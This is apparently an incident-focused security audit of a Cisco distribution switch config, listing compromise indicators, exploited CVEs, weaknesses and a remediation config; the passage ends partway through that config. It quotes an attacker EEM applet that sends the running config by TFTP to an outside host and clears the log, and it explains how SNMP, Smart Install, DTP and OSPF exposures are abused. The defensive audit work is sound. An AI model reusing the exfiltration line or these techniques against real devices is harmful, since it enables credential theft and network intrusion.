# Cisco switch config audit: BLDG1-DIST-SW01

**Source:** [[CISCO-Core-Switch-BLDG1-DIST-SW01-running-config.txt]]
**Platform/version:** Catalyst 3850-48P (`switch 1 provision ws-c3850-48p`), IOS XE `version 16.9` (exact release not in config) · **Inferred role:** Building L3 distribution / collapsed core. It has `ip routing`, gateway SVIs for all 8 VLANs with HSRP, OSPF to the firewall, a port-channel to IDF2, and server, camera and guest VLANs terminating here. · **Date:** 2026-11-12

> Secrets are masked. Every password, key and community string in the source file should be treated as compromised and rotated (see C4 and C7).

---

## Executive summary

**Treat this switch as compromised and start incident response before hardening it.**
- **Signs of compromise:**
  - The last config change was made by `cisco_tac_admin` (L5), a privilege-15 account (L43) whose name matches accounts attackers created after exploiting CVE-2023-20198.
  - An EEM applet sends the running config by TFTP to an outside address every night and then clears the log (L549-553).
  - ERSPAN copies the server VLAN to an outside IP (L558-563).
  - A GRE tunnel runs to another outside host (L472-476).
- **How it could have happened:** the switch exposes every major Cisco switch weakness that is being exploited right now:
  - the IOS XE web UI (CVE-2023-20198)
  - Smart Install explicitly on (CVE-2018-0171)
  - `public`/`private` SNMP with read-write access
  - a TFTP server that hands out `nvram:startup-config` to anyone
- **Credentials are effectively public:** they're stored in cleartext or reversibly, and the config can be downloaded without logging in.

Most of the internal controls don't do what they appear to:
- Guest is not isolated from the internal network.
- The server VLAN's outbound ACL doesn't exist, so nothing is filtered.
- The vty and HTTP ACLs permit everything or don't exist.
- Port security is never actually enabled.
- AAA falls back to `none`, which allows login without authentication.

| Severity | Count |
|---|---|
| Critical | 7 |
| High | 14 |
| Medium | 13 |
| Low | 7 |

## Priority actions

1. **Incident response first (C1).**
   - Preserve evidence before changing anything. Don't reload: the CVE-2023-20198 implant lives in memory and a reload destroys it as evidence.
   - At the firewall, block traffic to and from 203.0.113.45, 203.0.113.10, 198.51.100.20, 198.51.100.77 and 198.51.100.99.
   - Then remove the EEM applet, ERSPAN session, Tunnel0 and the unknown account (see the remediation config, step 1).
2. **Close the unauthenticated entry points (C2, C3, C4, C5).**
   - Run `no ip http server`, `no ip http secure-server`, `no vstack`, `no tftp-server ...`, `no service config` and `no boot network`.
   - Remove all SNMP communities and `system-shutdown`.
3. **Rotate every credential and remove the `none` fallbacks (C6, C7).**
   - This covers the enable secret, all local users, TACACS, the IKE pre-shared key, OSPF, NTP, the FTP/HTTP client passwords and SNMP.
   - Store them as type 9 secrets or type 6 keys.
   - Make console login require authentication.
4. **Lock down remote management (H1, H4).**
   - SSH v2 only.
   - A real management ACL on every vty line (0-31) and on HTTP if HTTP is ever re-enabled.
   - Remove `privilege level 15` from the vty lines and set session timeouts.
   - Move the HVAC vendor port out of the management VLAN.
5. **Restore segmentation (H2, H3).**
   - Rewrite GUEST-IN so guests can't reach anything internal.
   - Define PCI-SEGMENT. Fix SERVER-PROTECT's direction, wildcard and stray guest-host rule.
   - Prune the WLC trunk to the VLANs it needs.
   - Make OSPF passive on all user, guest and camera SVIs.
6. **Layer-2 cleanup in a change window (H7-H13).**
   - Set every edge port to access mode with `nonegotiate`, and shut unused ports.
   - Make this switch the STP root.
   - Remove BPDU filter, re-enable spanning tree on VLAN 50, and add BPDU guard.
   - Set VTP to transparent.
   - Rebuild Po1 with LACP and matching member configs.
   - Fix DAI on VLAN 30.
7. **Replace the legacy IPsec/PKI configuration (H5, H6)** and plan the move off 16.9 / 3850 (H14).

---

## Findings

### CRITICAL

### [CRITICAL] C1 Indicators of compromise
- **Evidence:**
  - `L5: ! Last configuration change ... by cisco_tac_admin` and `L43: username cisco_tac_admin privilege 15 secret 5 <redacted>`
  - `L549-553: event manager applet NIGHTLY-BACKUP`, which runs every night at 03:00 → `copy running-config tftp://203.0.113.45/bldg1.cfg` → `clear logging`
  - `L558-563: monitor session 2 type erspan-source / source vlan 100 rx / destination ip address 198.51.100.20` sends a copy of all traffic from the server VLAN to an outside host
  - `L472-476: interface Tunnel0 "BACKUP-LINK" tunnel destination 198.51.100.99`, a GRE tunnel sourced from the firewall link
  - `L537: snmp-server host 198.51.100.77 version 2c public` sends SNMP traps to an outside host
- **Risk:** Each item is a known persistence or exfiltration technique, including the Static Tundra and CVE-2023-20198 playbooks: create a privileged user, steal the config, mirror traffic, open a tunnel, change SNMP. Together, and with the exposures in C2-C5, they strongly suggest someone has control of this switch and is copying its config and server traffic off-site. Clearing the log after each run is anti-forensics. No legitimate backup job needs it.
- **Fix:**
  - Contain at the firewall first.
  - Collect evidence, starting with `show tech-support`, `show running-config`, `show users`, `show event manager policy registered`, `show monitor session all`, `show interfaces Tunnel0` and `show logging`. The full list is under Needs verification.
  - Check for the WebUI implant.
  - Then remove the artifacts (remediation config, step 1).
  - After cleanup, re-image from a known-good, hash-verified image and rebuild the config from a trusted baseline rather than editing this one.
  - Rotate every credential this switch has held, and check the TACACS server and other devices for the same artifacts.
- **Confidence:** Confirmed in the config. Whether each item was authorized needs confirming with the owner. Absent a change record, treat them as malicious.

### [CRITICAL] C2 IOS XE web UI enabled, with an undefined access-class (CVE-2023-20198 / 20273)
- **Evidence:** `L485: ip http server`, `L487: ip http secure-server`, `L486: ip http authentication enable`, `L488: ip http access-class 50` (ACL 50 doesn't exist), `L489: ip http timeout-policy ... life 86400`
- **Risk:**
  - CVE-2023-20198 (CVSS 10, CISA KEV) gives an unauthenticated attacker a privilege-15 account through the web UI, and CVE-2023-20273 then plants a root implant.
  - The access-class points to an ACL that doesn't exist, so it restricts nothing.
  - `authentication enable` makes the web UI accept the enable password.
  - This is the most likely way `cisco_tac_admin` (C1) was created.
- **Fix:** `no ip http server`, `no ip http secure-server`, `no ip http access-class 50`. Disabling the web UI does **not** remove an existing implant, so check for one before reloading.
- **Confidence:** Confirmed. Check exposure for this exact release with `show version` and the Cisco Software Checker. The 16.9 train never received a fix.

### [CRITICAL] C3 Smart Install explicitly enabled
- **Evidence:** `L594: vstack`
- **Risk:** CVE-2018-0171 (CVSS 9.8, CISA KEV). With no login, anyone who can reach TCP/4786 can download or replace the config or the IOS image, or crash the switch. Static Tundra and Salt Typhoon are actively exploiting it.
- **Fix:** `no vstack`. Also block TCP/4786 to all switch IPs at the firewall and on the inter-VLAN ACLs.
- **Confidence:** Confirmed. Run `show vstack config` to see whether it's operational.

### [CRITICAL] C4 Unauthenticated config download (TFTP server) and config injection at boot
- **Evidence:** `L544: tftp-server nvram:startup-config`, `L543: tftp-server flash:cat3k_caa-universalk9...bin`, `L13: service config`, `L31: boot network tftp://10.10.99.200/network-confg`
- **Risk:**
  - Anyone who can reach the switch can TFTP-download the startup config, with every credential in it, without authenticating. Combined with C7, that is full admin access.
  - At boot the switch fetches config from 10.10.99.200. Whoever controls that IP, or spoofs it on the management VLAN that the HVAC vendor port sits in (H4), can configure the switch.
- **Fix:** `no tftp-server nvram:startup-config`, `no tftp-server flash:...`, `no service config`, `no boot network tftp://10.10.99.200/network-confg`. The script rated this Medium. I raised it because it hands out credentials without a login.
- **Confidence:** Confirmed.

### [CRITICAL] C5 SNMP: default communities, read-write access with no restriction, remote reload
- **Evidence:**
  - `L529: snmp-server community <redacted> RO`, which is the factory default `public` with no ACL
  - `L530: snmp-server community <redacted> RW`, which is the factory default `private` with no ACL
  - `L531: snmp-server community <redacted> RW 60`, where ACL 60 isn't defined, so it permits everyone
  - `L532: snmp-server group LEGACY v3 noauth`
  - `L535: snmp-server system-shutdown`
  - `L538: snmp-server host 10.10.99.50 version 2c private`
- **Risk:**
  - Three read-write communities, all reachable from any source. A read-write community can replace the running config (CISCO-CONFIG-COPY-MIB), and `system-shutdown` lets SNMP reload the switch.
  - SNMP RCE bugs (CVE-2017-6736, CVE-2025-20352, both exploited) need only the read-only string, and `public` is the first one scanners try.
  - The trap host on L538 uses the read-write string as its trap community, so every trap sends it across the network in cleartext.
- **Fix:** Remove all communities, the v3 `noauth` group, `system-shutdown` and both trap hosts. Re-add SNMPv3 `priv` restricted to the NMS by ACL (remediation config, step 2).
- **Confidence:** Confirmed.

### [CRITICAL] C6 AAA falls back to `none`, and the console has no authentication
- **Evidence:** `L48: aaa authentication login default group tacacs+ none`, `L50: aaa authentication enable default group tacacs+ none`, `L51: aaa authorization exec default group tacacs+ none`, `L49: aaa authentication login CONSOLE none` → `L571: login authentication CONSOLE`
- **Risk:**
  - When the TACACS server is unreachable, every vty, HTTP and enable prompt lets anyone in without a password.
  - An attacker can cause that deliberately by flooding or blocking 10.10.100.20, which sits in the server VLAN behind this switch.
  - The console never asks for credentials at all.
- **Fix:** Replace `none` with `local` in every list. Point the console at a list that ends in `local`, and create a vaulted break-glass account. The TACACS server must be reachable (see C7 for its key).
- **Confidence:** Confirmed.

### [CRITICAL] C7 Credentials stored in cleartext or reversibly, and the config is publicly downloadable
- **Evidence:**
  - `L16: no service password-encryption`
  - `L38: enable password <redacted>` (cleartext)
  - `L37: enable secret 5` (MD5)
  - `L40: username admin ... password 0`
  - `L44: username helpdesk privilege 7 password 0`
  - `L42: username backup ... password 7`
  - `L578: password 7`
  - `L583: password <redacted>` (cleartext)
  - `L540: tacacs-server host ... key 0`
  - `L121: crypto isakmp key 0 ... address 0.0.0.0 0.0.0.0`
  - `L400: ip ospf authentication-key 0`
  - `L588: ntp authentication-key 1 md5` (cleartext)
  - `L84: ip ftp password`
  - `L86: ip http client password`
  - `L41/L43: secret 5` (MD5)
  - Banner `L567`: "Default admin login is in the IT Keepass"
- **Risk:** Through C2, C3, C4 or C5, anyone can get this file, and type 0 and type 7 values are readable or decode instantly. That includes the TACACS key, which lets an attacker impersonate the switch to the TACACS server. Assume the credentials are reused on other devices.
- **Fix:**
  - Rotate everything.
  - Use `enable algorithm-type scrypt secret` and `username ... algorithm-type scrypt secret`.
  - Store server and protocol keys as type 6 (`key config-key password-encrypt` + `password encryption aes`).
  - Remove the generic `admin`, `backup` and `helpdesk` accounts and the FTP/HTTP client passwords.
  - Remove the banner text.
- **Confidence:** Confirmed. The type 7 values are not decoded here; treat them as known.

---

### HIGH

### [HIGH] H1 Remote access: Telnet, SSH v1, vty ACLs that don't restrict, priv-15 vty lines
- **Evidence:**
  - Telnet: `L579: transport input telnet ssh`, `L584/L586: transport input all`
  - SSH settings: `L493: ip ssh version 1`, `L494-495` (120 s timeout, 5 retries)
  - ACLs: `L575: access-class 10 in` → `L523: access-list 10 permit any`; `L581: access-class 15 in` (ACL 15 undefined); `L585: line vty 16 31` has no access-class
  - `L577: privilege level 15`
  - `L572/L576/L582: exec-timeout 0 0`
- **Risk:**
  - All 32 vty lines accept Telnet, which sends credentials in cleartext, from any source.
  - SSH v1 is cryptographically broken.
  - Every user who logs in on vty 0-4 lands directly at privilege 15.
  - Idle sessions never time out.
- **Fix:** Use `transport input ssh`, `ip ssh version 2`, a real `MGMT-ACL` on `line vty 0 31`, `exec-timeout 10 0`, and no `privilege level`. Remove the line passwords: they're ignored under `aaa new-model` but still leak in the config. Check the RSA key with `show crypto key mypubkey rsa` and regenerate it at 3072 bits or more.
- **Confidence:** Confirmed.

### [HIGH] H2 Guest isolation is broken
- **Evidence:**
  - `L501-505: GUEST-IN` has `permit ip any any` **before** `deny ip 10.10.40.0 0.0.0.255 10.10.0.0 0.0.255.255`
  - `L480: network 10.10.0.0 0.0.255.255 area 0` covers Vlan40 with no passive-interface
  - `L66: dns-server ... 10.10.100.10` hands guests the internal DC as their DNS server
  - `L352-355: Gi1/0/32 WLC-GUEST-ANCHOR` is a trunk allowing all VLANs
  - `L517: permit ip host 10.10.40.25 any` in SERVER-PROTECT
- **Risk:**
  - ACLs are evaluated top-down, so the deny line never matches and guests can route to every internal subnet, including servers, management and cameras.
  - Guests can also form OSPF adjacencies.
  - The guest anchor controller carries every internal VLAN.
  - A specific guest-VLAN host is explicitly allowed everywhere. That rule looks deliberate, so investigate it under C1.
- **Fix:** Rewrite GUEST-IN in this order:
  1. Permit DHCP to the switch.
  2. Permit DNS to a public resolver.
  3. Deny `10.0.0.0/8`, `172.16.0.0/12` and `192.168.0.0/16`.
  4. Permit everything else (internet).

  Then make Vlan40 OSPF-passive, give the guest pool a public DNS server, prune Gi1/0/32 to VLAN 40, and remove the 10.10.40.25 rule.
- **Confidence:** Confirmed. Check `show ip access-lists GUEST-IN` hit counts.

### [HIGH] H3 Server/PCI segment unfiltered, and SERVER-PROTECT is broken
- **Evidence:**
  - `L470: ip access-group PCI-SEGMENT out`, and PCI-SEGMENT is never defined
  - `L469: ip access-group SERVER-PROTECT in`
  - `L514: permit tcp 10.10.10.0 255.255.255.0 ...` (a subnet mask used as a wildcard)
  - `L518: deny ip any any`
- **Risk:**
  - An undefined ACL filters nothing, so all traffic *to* the servers is permitted. The name suggests the PCI scope depends on this.
  - SERVER-PROTECT is applied `in`, so it filters traffic *from* the servers. Its rules are written for traffic *to* them.
  - As written, `deny ip any any` drops server replies to other VLANs, which should cause an outage unless the ACL isn't actually being enforced. The counters will tell you which.
  - Wildcard `255.255.255.0` matches only addresses ending in `.0`, so the SMB rule never matches what was intended.
- **Fix:** Define PCI-SEGMENT (traffic *to* servers, applied `out` on Vlan100) from real flows, ending in `deny ip any any log`. Rewrite SERVER-PROTECT for server egress, or remove it. Fix the wildcard to `0.0.0.255`.
- **Confidence:** Confirmed in the config. Check `show ip access-lists SERVER-PROTECT` counters and `show ip interface vlan 100`.

### [HIGH] H4 The management plane is reachable from everywhere
- **Evidence:**
  - `L507-511: MGMT-PROTECT` permits SSH, Telnet and SNMP from `any` and all of 10.10.0.0/16
  - `L375-379: Gi1/0/41 TEMP-VENDOR-HVAC` is in `vlan 99` (MGMT)
  - `L422-423: interface Vlan1 ip address 10.10.1.1`
  - `L173-175: Gi0/0` is in Mgmt-vrf, but nothing (TACACS, SNMP, NTP, syslog, SSH) uses the VRF
- **Risk:**
  - The management VLAN ACL permits everything, so it does no filtering.
  - A third-party HVAC device sits in the management VLAN, next to the TFTP boot server from C4.
  - The out-of-band management port isn't actually used.
- **Fix:**
  - Move Gi1/0/41 to an isolated vendor VLAN.
  - Rewrite MGMT-PROTECT to admit only jump hosts and the NMS.
  - Shut the Vlan1 SVI.
  - Move management services into Mgmt-vrf, or remove the VRF.
- **Confidence:** Confirmed.

### [HIGH] H5 IPsec VPN configured with broken crypto
- **Evidence:**
  - `L115-120: crypto isakmp policy 10` uses `encr des`, `hash md5` and `group 1`
  - `L121: crypto isakmp key 0 <redacted> address 0.0.0.0 0.0.0.0`
  - `L124: transform-set LEGACY-TS esp-des esp-md5-hmac`
  - `L520-521: VPN-TRAFFIC permit ip any any`
  - `L401: crypto map BRANCH-VPN` on Gi1/0/47
- **Risk:**
  - DES, MD5 and DH group 1 are all broken, and IKEv1 aggressive-mode PSK cracking applies.
  - The wildcard pre-shared key accepts any peer that knows it, and the key is in cleartext.
  - The crypto ACL matches all traffic.
  - The Catalyst 3850 isn't an IPsec platform, so this may not be functional at all. If so, it's leftover config that leaks a key. If it is functional, it may be an unauthorized tunnel to 203.0.113.10 (see C1).
- **Fix:** If the VPN isn't needed, remove the whole crypto block. If it is, terminate it on the firewall with IKEv2, AES-GCM-256, SHA-256 or better, DH group 19/20, a peer-specific key or certificates, and a specific crypto ACL.
- **Confidence:** The crypto is confirmed weak. Whether the VPN is active needs `show crypto isakmp sa`, `show crypto ipsec sa` and `show crypto map`.

### [HIGH] H6 PKI: 512-bit key, MD5 signing, expired self-signed certificate, no revocation checking
- **Evidence:**
  - `L98: rsakeypair TP-self-signed-... 512`
  - `L104-105: rsakeypair WEB-KEY 1024`, `hash md5`
  - `L97/L103: revocation-check none`
  - `L107-113`: the self-signed certificate's validity dates decode to 2015-03-01 → 2020-01-01 (expired)
- **Risk:** A 512-bit RSA key can be factored cheaply, so HTTPS sessions to the web UI can be impersonated or decrypted. The 1024-bit key with MD5 is also below any current baseline.
- **Fix:** Remove the trustpoints. If HTTPS is ever needed, use `crypto key generate rsa modulus 3072 label <KEY>` with a CA-issued SHA-256 certificate.
- **Confidence:** Confirmed from the config. `show crypto pki certificates` confirms the expiry.

### [HIGH] H7 Ports in DTP dynamic mode, and unused ports left enabled
- **Evidence:**
  - 20 enabled ports have no `switchport mode` or use dynamic mode: Gi1/0/6-8, 19-20, 24, 31, 33-40, 45-46, 48 and Gi1/1/1-2
  - `L350/L405: switchport mode dynamic desirable` on AP-LOBBY and LAB-BENCH
  - The conference-room jacks (Gi1/0/39-40) are dynamic auto
- **Risk:**
  - A laptop running Yersinia on any of these jacks negotiates a trunk and reaches every VLAN, including servers and management.
  - `dynamic desirable` ports actively ask for a trunk.
  - The conference rooms and lobby are publicly reachable.
- **Fix:** Put every edge port in `switchport mode access` + `switchport nonegotiate`. Park unused ports in a black-hole VLAN and shut them. Configure the AP as access or as a pruned trunk.
- **Confidence:** Confirmed. Run `show interfaces status` to see what's connected.

### [HIGH] H8 Spanning tree: wrong root, protections disabled
- **Evidence:**
  - `L138: spanning-tree vlan 1-4094 priority 61440`
  - `L139: no spanning-tree vlan 50`
  - `L317/L323: spanning-tree bpdufilter enable` on the ESXi trunks
  - `L141-142: errdisable recovery cause all / interval 30`
  - `L136: spanning-tree mode pvst`
  - BPDU guard is configured nowhere
- **Risk:**
  - The distribution switch is set to the *worst* priority, so any switch, including a rogue one on a dynamic port, becomes root and traffic flows through it.
  - The camera VLAN has no loop protection.
  - BPDU filter on the server trunks means a looping vSwitch or misplugged cable takes down the core.
  - Recovering `all` causes every 30 seconds re-enables ports that tripped a protection.
- **Fix:**
  - `spanning-tree vlan 1-4094 root primary` (or priority 4096).
  - `spanning-tree mode rapid-pvst`.
  - Re-enable VLAN 50.
  - Remove BPDU filter. Use `spanning-tree portfast edge trunk` + `bpduguard enable` instead.
  - `spanning-tree portfast edge bpduguard default`.
  - Restrict errdisable recovery to specific causes, at 300 seconds or more.
- **Confidence:** Confirmed. Run `show spanning-tree root` to see which switch is actually root.

### [HIGH] H9 VTP server v1 with no password
- **Evidence:** `L90-92`
- **Risk:** A switch with a higher revision number can delete every VLAN here and in IDF2, taking the building down.
- **Fix:** `vtp mode transparent`.
- **Confidence:** Confirmed. Check with `show vtp status`.

### [HIGH] H10 OSPF exposed to user and guest VLANs, weak authentication, unconditional default route
- **Evidence:** `L480: network 10.10.0.0 0.0.255.255 area 0` with no `passive-interface default`, `L399-400` simple cleartext authentication on Gi1/0/47 only, `L482: default-information originate always`
- **Risk:**
  - Any host on users, guest, lab or cameras can form an adjacency and inject routes, such as a more specific route for the server subnet, to intercept traffic.
  - `always` keeps advertising a default route even when the firewall link is down, so traffic is blackholed.
- **Fix:** `passive-interface default`, then `no passive-interface Gi1/0/47`. Use HMAC-SHA key-chain authentication on the firewall link. Remove `always` unless it's intended.
- **Confidence:** Confirmed. Run `show ip ospf interface brief`.

### [HIGH] H11 Directed broadcast on the user SVI
- **Evidence:** `L429: ip directed-broadcast` on Vlan10.
- **Risk:** Smurf-style amplification into, or from, the user VLAN.
- **Fix:** `no ip directed-broadcast`. If it's there for Wake-on-LAN, use a scoped ACL instead.
- **Confidence:** Confirmed.

### [HIGH] H12 Port-channel built with `mode on` and mismatched members
- **Evidence:** `L415/L420: channel-group 1 mode on`; `L413:` Te1/1/3 allows `10,20,30`, while Te1/1/4 and Po1 allow all VLANs.
- **Risk:**
  - With static bundling there's no LACP negotiation, so a miscabled or misconfigured far end can loop.
  - The mismatched members will be suspended or forward inconsistently, taking out the uplink to IDF2.
- **Fix:** Configure Po1 and both members identically (an explicit allowed list and native VLAN) and use `channel-group 1 mode active`. Change both ends in the same window.
- **Confidence:** Likely. Check `show etherchannel summary` and `show interfaces trunk`.

### [HIGH] H13 DAI enabled on the printer VLAN without DHCP snooping (outage)
- **Evidence:** `L76: ip arp inspection vlan 10,30` while `L74: ip dhcp snooping vlan 10,20`. VLAN 30 isn't snooped, and printers use static IPs.
- **Risk:** With no binding table and no ARP ACL, DAI drops every ARP on VLAN 30, so printers are unreachable. On VLAN 10, statically addressed hosts and any ARP arriving on Po1 (which isn't trusted) are dropped too.
- **Fix:** `no ip arp inspection vlan 30`, or add an `arp access-list` for the printers. Put `ip arp inspection trust` on Po1.
- **Confidence:** Likely. Run `show ip arp inspection statistics vlan 30`.

### [HIGH] H14 Old software train on an aging platform
- **Evidence:** `L8: version 16.9`; `ws-c3850-48p`.
- **Risk:** 16.9 is out of software maintenance and never got the CVE-2023-20198 fix. The 3850's last train is 16.12, and the platform is end-of-sale. Static Tundra targets older Catalyst hardware like this.
- **Fix:** After incident response, re-image to the latest 16.12.x from a verified source, and plan a Catalyst 9300 replacement.
- **Confidence:** Needs verification with `show version` and the Cisco Software Checker.

---

### MEDIUM

- **M1 Port security configured but never enabled** (`L200-202`, `L209-211`). The sub-commands are there but `switchport port-security` itself is missing, so they do nothing. A maximum of 50 and `violation protect` (silent drop) would be weak even if it were on. Fix: enable 802.1X/MAB, or use `switchport port-security` with a maximum of 2, `violation restrict` and `aging time 10`.
- **M2 Trunk hygiene** (`L169-171`, `L272-280`, `L313-323`, `L352-355`): native VLAN 1, no allowed list on Po1, the ESXi trunks or the WLC trunk, DTP still on, and phone ports Gi1/0/17-18 configured as trunks. Fix: explicit allowed lists, an unused native VLAN, `nonegotiate`, and access + `voice vlan` on phone ports.
- **M3 Ports assigned to VLANs that don't exist** (`L269` voice VLAN 21 on PHONE-204, `L327` VLAN 101 on FILE-SERVER-01). Those ports are inactive. Fix: correct the VLAN IDs. Confirm with `show interfaces Gi1/0/27 switchport`.
- **M4 HSRP authentication** (`L435`): Vlan10 uses plaintext auth with the default string `cisco`. Vlan20 (`L441-442`) has no auth. Any host can take over the gateway. Fix: `standby <grp> authentication md5 key-string <KEY>` on both peers in the same window.
- **M5 Logging can't support an investigation** (`L14-15`, `L34-35`, no `logging host`, no `archive`): uptime timestamps, a 4 KB debugging-level buffer, debug output to console, no syslog server, no config-change log, and logs cleared nightly by the EEM applet (C1). Fix: syslog to a SIEM, datetime timestamps, `logging buffered 128000 informational`, `no logging console`, `archive log config`, and `login on-failure log`.
- **M6 NTP** (`L588-592`): a key is defined but `ntp authenticate` isn't set and the servers aren't tied to it, so nothing is authenticated. `ntp master 3` serves its own clock as authoritative even when unsynced, and an unauthenticated public NTP server is in use. Fix: authenticated internal NTP and `no ntp master`.
- **M7 Legacy services** (`L10-12`, `L78-81`): TCP/UDP small servers, finger, the BOOTP server, IP source routing and the DNS server. Remove them all.
- **M8 IPv6 on Vlan10 with no first-hop security or ACLs** (`L430-431`, `L527`). Rogue router advertisements can intercept user traffic, and IPv6 bypasses every IPv4 ACL. Fix: RA Guard / device-tracking, plus IPv6 ACLs or disable IPv6.
- **M9 SPAN of user and server traffic to Gi1/0/42 "SNIFFER"** (`L555-556`). That port receives both directions of traffic on VLANs 10 and 100. Confirm it's authorized. If not, remove it with the C1 cleanup.
- **M10 DHCP pools** (`L63-72`): guest leases never expire (pool exhaustion, no accountability), and the LAB pool sends TFTP option 150 pointing at 10.10.99.200, the same host as C4. Fix: 8-24 hour leases, and review option 150.
- **M11 SNMPv3 `noauth` group** (`L532`): no authentication or encryption, and no ACL. It's removed as part of C5.
- **M12 Information disclosure**: the banner (`L565-568`) states the model, version and a Keepass hint, and `snmp-server contact` (`L534`) includes a name and pager number. Use a legal-warning banner and a role contact instead.
- **M13 Generic and shared accounts** (`L40-44`): `admin`, `backup` and `helpdesk` with shared passwords, so there's no accountability. Use named TACACS accounts plus a single break-glass account.

### LOW

- **L1** Proxy ARP, redirects and unreachables are on for all SVIs and Gi1/0/47. Turn them off.
- **L2** `ip default-gateway` (`L491`) is ignored because `ip routing` is on. Remove it.
- **L3** No storm-control, Loop Guard or `login block-for`, and no password minimum length.
- **L4** `ip name-server 8.8.8.8` (`L60`) sends switch DNS lookups off-site. Use an internal resolver.
- **L5** CDP and LLDP run on every port, including the lobby and conference rooms. Disable them on untrusted edge ports.
- **L6** There's no AAA accounting, so commands aren't attributable even when TACACS is up.
- **L7** The `helpdesk` account has privilege 7 (`L44`), but no command authorization defines what level 7 can do. Review it when you set up TACACS command authorization.

**Dropped from the script output:** CORR-05, DHCP snooping with no trusted ports. This switch is the DHCP relay (`ip helper-address` on Vlan10/20), so snooping works without a trusted port here.

---

## Needs verification

Collect evidence **before** making changes:
```
show clock detail
show version
show users
show running-config
show startup-config
show archive
show logging
show event manager policy registered
show event manager history events
show monitor session all
show interfaces Tunnel0
show crypto isakmp sa
show crypto ipsec sa
show crypto session
show snmp community
show snmp host
show snmp user
show vstack config
show ip http server status
show platform software process list switch active r0 | include nginx
show tech-support | redirect flash:pre-ir-showtech.txt
```
WebUI implant check, run from an admin host. A hex string in the response means the implant is present; newer variants may evade this check.
```
curl -k -X POST "https://10.10.99.1/webui/logoutconfirm.html?logon_hash=1"
```
Then:
```
show vtp status
show spanning-tree root
show interfaces status
show interfaces trunk
show etherchannel summary
show ip access-lists
show ip interface vlan 40
show ip interface vlan 100
show ip arp inspection statistics
show ip dhcp snooping binding
show ip ospf neighbor
show ip ospf interface brief
show standby brief
show crypto pki certificates
show crypto key mypubkey rsa
verify /md5 flash:cat3k_caa-universalk9.16.09.04.SPA.bin
```
Compare the image hash with Cisco's published value. Also check the TACACS server (10.10.100.20) logs for `cisco_tac_admin` and logins from unexpected sources.

---

## Remediation config

Apply from the console, with incident-response sign-off. Set `reload in 20` only **after** evidence has been collected. Placeholders are in `<>`.

```
! ===== 1. CONTAINMENT: remove persistence / exfil (after evidence capture) =====
no event manager applet NIGHTLY-BACKUP
no monitor session 2
no monitor session 1                 ! re-add only if SPAN is authorised
no interface Tunnel0
no snmp-server host 198.51.100.77 version 2c public
no snmp-server host 10.10.99.50 version 2c private
no username cisco_tac_admin
! also block 203.0.113.0/24 and 198.51.100.0/24 hosts at the firewall

! ===== 2. Unauthenticated entry points =====
no ip http server
no ip http secure-server
no ip http access-class 50
no vstack
no tftp-server nvram:startup-config
no tftp-server flash:cat3k_caa-universalk9.16.09.04.SPA.bin
no service config
no boot network tftp://10.10.99.200/network-confg
no snmp-server community public RO
no snmp-server community private RW
no snmp-server community <ROTATED-RW> RW 60
no snmp-server group LEGACY v3 noauth
no snmp-server system-shutdown
ip access-list standard SNMP-NMS
 permit host <NMS-IP>
 deny any log
snmp-server view NMS-VIEW iso included
snmp-server group NMS v3 priv read NMS-VIEW access SNMP-NMS
snmp-server user <SNMP-USER> NMS v3 auth sha <AUTH-PASS> priv aes 256 <PRIV-PASS>
snmp-server host <NMS-IP> version 3 priv <SNMP-USER>

! ===== 3. Credentials + AAA  !!! LOCKOUT RISK: keep console session open !!! =====
key config-key password-encrypt <MASTER-KEY>
password encryption aes
service password-encryption
security passwords min-length 14
no enable password
enable algorithm-type scrypt secret <NEW-ENABLE-SECRET>
username <BREAKGLASS> privilege 15 algorithm-type scrypt secret <VAULTED-PASS>
no username admin
no username backup
no username helpdesk
username netops privilege 15 algorithm-type scrypt secret <NEW-PASS>   ! or remove; use TACACS
no ip ftp password
no ip ftp username backup
no ip http client password
no ip http client username admin
no tacacs-server host 10.10.100.20
tacacs server TAC1
 address ipv4 10.10.100.20
 key 0 <NEW-TACACS-KEY>             ! stored as type 6
aaa group server tacacs+ TACACS
 server name TAC1
aaa authentication login default group TACACS local
aaa authentication login CONSOLE local
aaa authentication enable default group TACACS enable
aaa authorization exec default group TACACS local if-authenticated
aaa authorization console
aaa accounting exec default start-stop group TACACS
aaa accounting commands 15 default start-stop group TACACS
login block-for 120 attempts 5 within 60
login on-failure log
banner motd ^C
Authorized access only. Activity is monitored and logged.
^C

! ===== 4. Remote access  !!! LOCKOUT RISK: <MGMT-NET> must include your host !!! =====
ip access-list standard MGMT-ACL
 permit <MGMT-NET> <WILDCARD>
 deny any log
crypto key generate rsa modulus 3072
ip ssh version 2
ip ssh time-out 60
ip ssh authentication-retries 3
no ip scp server enable              ! re-enable only if used
line con 0
 exec-timeout 10 0
line vty 0 31
 no password
 no privilege level
 access-class MGMT-ACL in
 transport input ssh
 exec-timeout 10 0
no access-list 10
no ip access-list standard VTY-ACCESS
no access-list 20

! ===== 5. Legacy services / logging / time =====
no service tcp-small-servers
no service udp-small-servers
no service finger
no ip finger
no ip bootp server
no ip source-route
no ip dns server
service timestamps log datetime msec localtime show-timezone
service timestamps debug datetime msec localtime show-timezone
no logging console
logging buffered 128000 informational
logging host <SYSLOG-IP>
logging trap informational
archive
 log config
  logging enable
  notify syslog contenttype plaintext
  hidekeys
no ntp master
no ntp server 129.6.15.28
no ntp authentication-key 1
ntp authentication-key 1 hmac-sha2-256 <NTP-KEY>
ntp authenticate
ntp trusted-key 1
ntp server <NTP-IP> key 1

! ===== 6. Remove legacy crypto / PKI (if VPN is not required) =====
no crypto map BRANCH-VPN
no crypto ipsec transform-set LEGACY-TS
no crypto isakmp key <ROTATED> address 0.0.0.0 0.0.0.0
no crypto isakmp policy 10
no ip access-list extended VPN-TRAFFIC
no crypto pki trustpoint WEB-CERT
no crypto pki trustpoint TP-self-signed-2481937710

! ===== 7. Segmentation  !!! TRAFFIC-AFFECTING: build from real flows !!! =====
ip access-list extended GUEST-IN
 permit udp any any eq bootps
 permit udp 10.10.40.0 0.0.0.255 host <PUBLIC-DNS> eq domain
 deny   ip any 10.0.0.0 0.255.255.255
 deny   ip any 172.16.0.0 0.15.255.255
 deny   ip any 192.168.0.0 0.0.255.255
 permit ip 10.10.40.0 0.0.0.255 any
ip dhcp pool GUEST
 no dns-server
 dns-server <PUBLIC-DNS>
 lease 0 8
ip access-list extended PCI-SEGMENT
 permit tcp 10.10.10.0 0.0.0.255 10.10.100.0 0.0.0.255 eq 445
 permit tcp <ADMIN-NET> <WILDCARD> 10.10.100.0 0.0.0.255 eq 3389
 permit udp 10.10.0.0 0.0.255.255 host 10.10.100.10 eq domain
 ! ... add verified flows ...
 deny   ip any any log
interface Vlan100
